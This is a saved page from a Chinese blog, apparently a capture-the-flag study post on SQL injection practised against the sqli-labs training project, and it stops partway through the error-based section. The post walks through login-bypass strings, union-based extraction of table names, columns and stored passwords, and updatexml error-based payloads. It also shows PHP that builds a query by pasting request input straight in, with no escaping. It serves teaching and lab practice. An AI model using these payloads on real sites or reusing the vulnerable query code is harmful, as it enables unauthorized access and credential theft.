@@ -1,0 +1,456 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入原理及注入过程 | BayMRX</title><meta name="author" content="BayMRX."><meta name="copyright" content="BayMRX."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入简介 SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。  SQL注入的学习"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://baymrx.me/posts/e73517db"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="IbymInmKSwzYJ23XxtbfrpA2D96JFdilyCVyLbs4GgM"/><meta name="baidu-site-verification" content="code-BtlqGhZrrC"/><meta name="bing_site_verification" content="b9caa36ba366bb642aeb89e4131554ce"/><meta name="qihu_site_verification" content="6f988dabfd2b02d14e6417fe33a6724d"/><meta name="yandex_site_verification" content="bfe4578ce1f4a696"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d2fc5e9d22507d4a0c94eb1ada8ba3d3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-BMPDN6HEFJ"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BMPDN6HEFJ');
+</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;5871bbc4381146fa8bd5f570f00a53f3&quot;}"></script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "6ehiseir6t");</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: BayMRX.","link":"链接: ","source":"来源: BayMRX","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入原理及注入过程',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-07 13:13:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200705230504.png')"><nav id="nav"><span id="blog-info"><a href="/" title="BayMRX"><span class="site-name">BayMRX</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入原理及注入过程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-05T15:01:10.000Z" title="发表于 2020-07-05 23:01:10">2020-07-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-07T05:13:01.266Z" title="更新于 2024-01-07 13:13:01">2024-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入原理及注入过程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/e73517db#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SQL注入简介">SQL注入简介</h2>
+<p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<blockquote>
+<p>SQL注入的学习过程我使用GitHub的一个开源项目进行练习<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Audi-1/sqli-labs">[Sqli-Lab项目地址]</a></p>
+</blockquote>
+<h2 id="万能密码">万能密码</h2>
+<p>这里使用的是<code>Less-11</code>进行试验</p>
+<p><code>Less-11</code>的页面存在一个的登录框</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706094848871.png" alt="image-20200706094848871"></p>
+<p>一般最简单的登录框在登陆的时候是直接传参到数据库中进行查询，所使用的查询语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;;</span><br></pre></td></tr></table></figure>
+<h3 id="1-逻辑或注入">1.逻辑或注入</h3>
+<p>如果我们使where条件为真，那么必然会有查询结果输出</p>
+<p>我们可以在username中输入任意值，在password中输入<code>1' or '1'='1</code>，提交之后可以看到我们使用Dumb账户登陆成功了</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706100142370.png" alt="image-20200706100142370"></p>
+<p>分析一下，如果我们使用这样的密码进行登录，所对应的数据库查询语句一般为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;123&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+<p>由于or后面的<code>'1'='1'</code>的布尔值是必然为真，所以where语句的结果也必然为真，所以页面会使用从数据库中查询出来的第一个账户进行登录</p>
+<p>那么如果我们不想使用第一个账户进行登录该怎么办呢？</p>
+<p>可以使用limit限制查询输出，从而达到使用其他账户进行登录的目的，在password中注入：<code>1' or 1=1 limit 7,1 -- +</code></p>
+<p>提交后发现使用admin账户进行了登录</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706103346976.png" alt="image-20200706103346976"></p>
+<p>分析一下，将注入的数据代入SQL语句可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;123&#x27; and password=&#x27;1&#x27;  or 1=1 limit 7,1 -- +;</span><br></pre></td></tr></table></figure>
+<p>当我们限制在第8个查询位输出的时候，就可以以admin账号进行登录了</p>
+<h3 id="2-注释符注入">2.注释符注入</h3>
+<p>在登陆查询的时候，where语句会匹配username和password两个字段，如果我们将password字段的匹配语句使用注释符注释掉，那么就可以实现以数据库中的任意账户进行登录</p>
+<p>如图，username中注入<code>admin'/*</code>，password中注入<code>*/'</code>，提交查询后我们就可以看到网页以admin账户进行登录了</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706110849938.png" alt="image-20200706110849938"></p>
+<p>再来到具体的SQL语句中进行分析，我们注入后，数据库要执行的查询语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;admin&#x27;/*&#x27; and password=&#x27;*/&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>可以看到SQL语句中有一部分被注释掉了，数据库实际所执行的语句是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;admin&#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>我们注释掉了password字段的匹配处理，从而可以使得我们以admin账号任意登陆</p>
+<p>以上两种注入方式就是一般情况下所使用的的万能密码注入。</p>
+<h2 id="联合注入">联合注入</h2>
+<p>此注入方式只适合数据库查询的信息在页面有显示的情况下才能使用。</p>
+<h3 id="1-测注入点">1.测注入点</h3>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p>看上面这个URL，是以GET的方式请求页面数据，猜测在<code>id=1</code>处存在注入点</p>
+<p>尝试在参数值的后面添加引号或者右括号来测试，如果页面产生报错信息，则极有可能存在注入点，比如在id的参数值后面加个单引号，提交后页面提示有语法错误，我们就可以判断存在SQL注入漏洞。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705180207890.png" alt="image-20200705180207890"></p>
+<h3 id="2-求闭合字符">2.求闭合字符</h3>
+<p>一般可以使SQL语句闭合的符号有三个：<code>'</code>、<code>&quot;</code>和<code>)</code>，我们可以通过自由组合或者选择其中一个进行测试</p>
+<p>具体该用哪个闭合字符，我们可以使用逻辑与进行判断</p>
+<ul>
+<li>and 1=1</li>
+<li>and 1=2</li>
+</ul>
+<p>根据SQL语句的语法规则，如果我们正常闭合了前面的语句，那么后面的语句则会被正常执行。即当我们在后面注入<code>and 1=1</code>的时候，页面输出的结果应该与不带任何注入语句一样；当我们注入<code>and 1=2</code>的时候，由于<code>1=2</code>的逻辑判断值为假，页面应该不会有任何输出。所以如果我们正确注入了闭合字符，则会满足上面两个条件。</p>
+<p>下面来看几个例子：</p>
+<p>首先尝试使用双引号判断注入字符，可以看到能正常输出</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193428823.png" alt="image-20200705193428823"></p>
+<blockquote>
+<p>这里URL中的<code>%23</code>是URL编码，转为字符就是<code>#</code>，<code>#</code>在SQL语句中代表注释，它会注释掉后面的所有SQL语句，使其不再执行</p>
+</blockquote>
+<p>然后我们再注入<code>and 1=1</code>，同样可以正常输出</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193620938.png" alt="image-20200705193620938"></p>
+<p>再注入<code>and 1=2</code>，依然可以输出</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193637969.png" alt="image-20200705193637969"></p>
+<p>那么就可以判断双引号是没法使SQL语句闭合的</p>
+<p>再换单引号进行尝试，当在单引号后面注入<code>and 1=2</code>的时候，会发现页面上的输出为空，那么证明我们的闭合是有效的</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193710222.png" alt="image-20200705193710222"></p>
+<p>由此可以确定此处需要使用的闭合字符为单引号<code>'</code></p>
+<h3 id="3-求列数">3.求列数</h3>
+<p>在SQL注入的时候，我们需要知道数据库后台一共查询了几列数据，才能利用网页源码中的函数将我们所需要的信息输出到页面上</p>
+<p>确定查询的字段数可以使用<code>order by</code>函数，后面跟我们猜测的字段数，要是后面跟着的数字超出了字段数的时候，则会报错！通过这个我们可以确定网页所查询数据库的字段数。</p>
+<p>当我们要求按照第三列数据进行排序的时候，页面不会显示任何信息</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705194441449.png" alt="image-20200705194441449"></p>
+<p>然而当改为按照第四列排序的时候，会发现页面显示了报错信息，提示没有第4列数据</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705194534155.png" alt="image-20200705194534155"></p>
+<p>这时我们就可以判断网页源码通过数据库查询出来的数据有三个字段</p>
+<h3 id="4-求显示位">4.求显示位</h3>
+<p>为什么要求显示位？因为某些原因，开发人员在编写网页代码的时候，并不一定将查询到的所有数据都显示在网页上，可能只会显示其中的某几列数据，这时候我们就需要确定显示在页面上的是哪几列，这样才能让我们后面查询到的隐秘信息正确输出在页面中。</p>
+<p>比如下面的PHP源码：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/test.sql">test数据库文件下载</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$connect</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;set names &#x27;gbk&#x27;&quot;</span>,<span class="variable">$connect</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$ida</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$query</span> = <span class="string">&#x27;select name,age,email from information where id = &quot;&#x27;</span>.<span class="variable">$ida</span>.<span class="string">&#x27;&quot; limit 0,1&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>网页从数据库中查询了三个字段：<code>name</code>,<code>age</code>,<code>email</code>，但是网页只输出了<code>name</code>和<code>age</code>两个字段。</p>
+<p>上面第3步确定了查询的字段数之后，我们就可以使用联合查询输出指定字符来判断显示位</p>
+<p>先看一个在数据库命令行中的查询结果</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705201854090.png" alt="image-20200705201854090"></p>
+<p>直接<code>select 1,2,3</code>，则也会直接在查询结果中显示出来</p>
+<p>所以我们联合查询选择1,2,3，通过判断输出显示的数字就可以判断显示位</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705202235782.png" alt="image-20200705202235782"></p>
+<p>可以看到页面显示出来的是2和3，证明显示位是第二列和第三列的数据</p>
+<blockquote>
+<p>URL中的<code>--+</code>其实也是注释符，与上面的<code>#</code>是同样的效果</p>
+</blockquote>
+<h3 id="5-求库名">5.求库名</h3>
+<p>数据库名的查询可以借助于<code>database()</code>函数，这个函数会输出当前查询所使用的数据库的名称</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705202828408.png" alt="image-20200705202828408"></p>
+<p>这里查询出来的数据库名为<code>security</code></p>
+<h3 id="6-求表名">6.求表名</h3>
+<p>表名和字段名（列名）的查询需要借助<code>information_schema</code>这个数据库，在这个数据库中存储着当前用户名下所有数据库、数据表和表内字段的基本信息。</p>
+<p>求表名需要查询这个数据库中的<code>tables</code>数据表，同样借助于联合查询进行输出</p>
+<p>注入的语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,table_name,2 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705203450905.png" alt="image-20200705203450905"></p>
+<p>但是这只输出了一个数据表的名称，显然emails并不是我们想要的表，要想输出查询结果中的所有表的名称，可以使用连接函数<code>group_concat()</code>将所有的结果连接为一个字符串输出</p>
+<p>连接后的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705203807557.png" alt="image-20200705203807557"></p>
+<p>根据名称的含义可以猜测，users表即为我们迫切想要求得的表</p>
+<h3 id="7-求列名（字段名）">7.求列名（字段名）</h3>
+<p>用与上面同样的方法求列名，这次查询的是<code>columns</code>表</p>
+<p>注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- +</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705204121926.png" alt="image-20200705204121926"></p>
+<p><code>username</code>和<code>password</code>字段就是我们想要的结果</p>
+<h3 id="7-求列名">7.求列名</h3>
+<h3 id="8-查数据">8.查数据</h3>
+<p>知道了表名和字段名后，我们就可以通过注入的方式拿到存在数据库中的用户名和密码了</p>
+<p>还是使用联合查询进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(username,0x23,password),2 from security.users -- +</span><br></pre></td></tr></table></figure>
+<p>将<code>username</code>和<code>password</code>使用<code>#</code>进行拼接后输出，得到的结果为</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705204458093.png" alt="image-20200705204458093"></p>
+<p>从结果中可以直接看到账号admin的密码为admin</p>
+<p>—至此便完成了联合查询的SQL注入的整个过程。</p>
+<h2 id="报错注入">报错注入</h2>
+<p><strong>updatexml()函数</strong></p>
+<p><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></p>
+<ul>
+<li>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+</li>
+<li>
+<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
+</li>
+<li>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+</li>
+<li>
+<p>作用：改变文档中符合条件的节点的值(改变XML_document中符合XPATH_string的值)</p>
+</li>
+</ul>
+<p>当updatexml函数的第二个参数XPath_string未满足XPath语法的时候，会产生报错并带出关键信息。但是这个函数能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用字符串截取函数或者分段显示进行处理。</p>
+<h3 id="1-测注入点-2">1.测注入点</h3>
+<h3 id="2-求闭合字符-2">2.求闭合字符</h3>
+<p>这两步与上面联合注入的过程一样，此处就不再赘述<a href="/posts/e73517db.html#1%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9">[传送门]</a></p>
+<h3 id="3-求库名">3.求库名</h3>
+<p>注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select concat(0x23,database(),0x23)),1) -- +</span><br></pre></td></tr></table></figure>
+<p>这里将查询使用<code>#</code>包起来是为了使得查询报错，例如查询一个开头为<code>#</code>字段，数据库肯定会报错</p>
+<p>上面注入语句的查询结果为：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705221108478.png" alt="image-20200705221108478"></p>
+<p>可以看到报错泄露出来的数据库名为<code>security</code></p>
+<h3 id="4-求表名">4.求表名</h3>
+<p>嵌入select查询语句，在<code>information_schema</code>库中查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select group_concat(0x23,table_name,0x23) from information_schema.tables where table_schema=&#x27;security&#x27;),1) -- +</span><br></pre></td></tr></table></figure>
+<p>查询结果为：</p>
